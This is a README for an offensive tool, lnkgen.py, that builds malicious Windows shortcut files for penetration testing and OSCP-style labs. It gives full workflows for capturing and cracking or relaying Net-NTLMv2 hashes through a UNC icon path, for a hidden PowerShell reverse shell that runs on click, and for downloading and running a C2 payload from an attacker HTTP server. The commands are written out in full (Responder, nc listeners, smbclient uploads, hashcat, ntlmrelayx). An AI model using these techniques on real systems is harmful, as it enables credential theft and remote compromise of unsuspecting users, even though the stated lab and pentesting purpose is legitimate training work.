# lnkgen.py

Generate malicious Windows `.lnk` shortcut files for penetration testing. Covers the three most common LNK attack patterns used in OSCP labs and real engagements.

---

## Install

```bash
sudo apt install python3-pylnk3

# If not in apt:
pip install pylnk3
```

---

## Modes

### `ntlm` — NTLM Hash Capture

Sets the LNK icon path to a UNC path on your machine. When a user browses the folder containing this file, Windows automatically tries to load the icon over SMB and sends their Net-NTLMv2 credentials to you.

**No click required — browse to folder is enough.**

```bash
python3 lnkgen.py ntlm -i 192.168.45.212 -o steal.lnk
```

**Workflow:**
```bash
# 1. Start Responder FIRST
sudo responder -I tun0 -wv

# 2. Generate the LNK
python3 lnkgen.py ntlm -i 192.168.45.212 -o steal.lnk

# 3. Upload to the share
smbclient //TARGET_IP/sharename -u USER -p PASS
smb: \> put steal.lnk

# 4. Wait — Responder captures the hash automatically
# [SMB] NTLMv2 Hash: Administrator::DOMAIN:hash...

# 5. Crack it
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

> **Note:** Hashes saved automatically to `/usr/share/responder/logs/SMB-NTLMv2-*.txt`

> **Note:** Net-NTLMv2 hashes cannot be used for pass-the-hash directly — crack them first to get plaintext, or use ntlmrelayx to relay them.

---

### `shell` — Reverse Shell on Click

Target is `cmd.exe` with a hidden PowerShell reverse shell as arguments. Executes when the user double-clicks the LNK. Uses a minimized window so the user sees nothing.

```bash
python3 lnkgen.py shell -i 192.168.45.212 -p 4444 -o shell.lnk
```

**Workflow:**
```bash
# 1. Start listener
nc -lvnp 4444

# 2. Generate the LNK
python3 lnkgen.py shell -i 192.168.45.212 -p 4444 -o shell.lnk

# 3. Upload to share
smbclient //TARGET_IP/sharename -u USER -p PASS
smb: \> put shell.lnk

# 4. Wait for simulated user to click it
```

> **Tip:** In OffSec labs, a simulated user often browses and clicks files on a schedule. Leave it and check back.

---

### `drop` — Download and Execute Payload on Click

Downloads a payload from your HTTP server to `%TEMP%` and executes it. Useful for delivering a C2 agent (Apollo, etc.) without embedding shellcode in the LNK itself.

```bash
python3 lnkgen.py drop -i 192.168.45.212 -f apollo.exe -o drop.lnk
```

**Workflow:**
```bash
# 1. Serve your payload
cp apollo.exe /tmp/serve/
cd /tmp/serve && python3 -m http.server 80

# 2. Generate the LNK
python3 lnkgen.py drop -i 192.168.45.212 -f apollo.exe -o drop.lnk

# 3. Upload to share
smbclient //TARGET_IP/sharename -u USER -p PASS
smb: \> put drop.lnk

# 4. Wait for C2 callback
```

---

## All Options

```
usage: lnkgen.py [-h] -i IP [-o OUTPUT] [-p PORT] [-f FILE] [-s SHARE] {ntlm,shell,drop}

positional arguments:
  {ntlm,shell,drop}     Type of LNK to generate

options:
  -i, --ip IP           Your attacker IP (tun0)
  -o, --output OUTPUT   Output filename (default: payload.lnk)
  -p, --port PORT       Port for reverse shell or HTTP server (default: 4444)
  -f, --file FILE       Payload filename to serve (drop mode)
  -s, --share SHARE     SMB share name for NTLM UNC path (default: share)
```

---

## Quick Reference

| Mode | Trigger | Listener needed |
|---|---|---|
| `ntlm` | Browse folder | `responder -I tun0 -wv` |
| `shell` | Double-click | `nc -lvnp PORT` |
| `drop` | Double-click | `python3 -m http.server 80` |

---

## How LNK Files Work

A `.lnk` file has several fields Windows uses when rendering or executing it:

- **Target** — what gets executed on double-click (`cmd.exe`, `powershell.exe`, etc.)
- **Arguments** — command-line args passed to the target
- **Icon path** — where Windows loads the display icon from (can be a UNC path)
- **Window mode** — `Minimized` hides the window from the user

The NTLM attack abuses the icon path field. The shell and drop attacks abuse the target and arguments fields.

---

## Cracking Captured Hashes

```bash
# Hashes auto-saved by Responder here:
cat /usr/share/responder/logs/SMB-NTLMv2-SSP-*.txt

# Crack with hashcat (mode 5600 = Net-NTLMv2)
hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt

# With rules for better coverage
hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule

# Filter out machine accounts (not worth cracking)
grep -v '\$$' /usr/share/responder/logs/SMB-NTLMv2-SSP-*.txt > human_hashes.txt
```

## Relaying Instead of Cracking

If SMB signing is disabled on other hosts, you can relay captured auth directly without cracking:

```bash
# Check which hosts have signing disabled
crackmapexec smb TARGET_RANGE --gen-relay-list relay_targets.txt

# Stop Responder, run ntlmrelayx instead
sudo impacket-ntlmrelayx -tf relay_targets.txt -smb2support

# Restart Responder — captured auth gets forwarded automatically
sudo responder -I tun0 -wv
```
